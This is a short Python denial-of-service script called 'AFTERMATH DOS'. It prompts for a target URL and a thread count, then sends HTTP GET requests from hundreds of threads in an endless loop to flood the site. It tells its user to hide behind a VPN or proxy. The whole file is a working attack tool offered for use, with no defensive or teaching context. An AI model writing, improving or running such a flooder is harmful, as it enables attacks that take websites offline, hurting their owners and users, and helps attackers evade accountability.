# AFTERMATH DOS - URL VERSION
import requests
from colorama import Fore, init
import threading
init()
print(Fore.LIGHTGREEN_EX + "Welcome to AFTERMATH DOS")
print(Fore.LIGHTYELLOW_EX + "Please use VPN or PROXY to protect your IP!")
print(Fore.LIGHTRED_EX + "Input URL:")
url = input(Fore.MAGENTA + ">>> ")
print(Fore.LIGHTRED_EX + "Threads count(default:256):")
threads = input(Fore.YELLOW + ">>> ")


def Menu(thread=threads):
    if thread == "":
        thread = 0
        threads1 = thread + 256
    else:
        threads1 = thread

    if url == "":
        Menu()
    else:
        threading_start(thread=int(threads1))


def threading_start(thread):
    print(Fore.LIGHTRED_EX + "          STARTING ATTACK")
    print(Fore.LIGHTRED_EX + "=====================================")
    while True:
        for i in range(thread):
            th = threading.Thread(target=req)
            th.start()
            th.join(timeout=0.05)


def req():
    r = requests.get(url)
    packet_stat = r.status_code
    if packet_stat == 200:
        print(Fore.LIGHTGREEN_EX + "Request sent on: " + url)
    else:
        print(Fore.LIGHTRED_EX + "UNKNOWN ERROR!")

Menu(thread=threads)
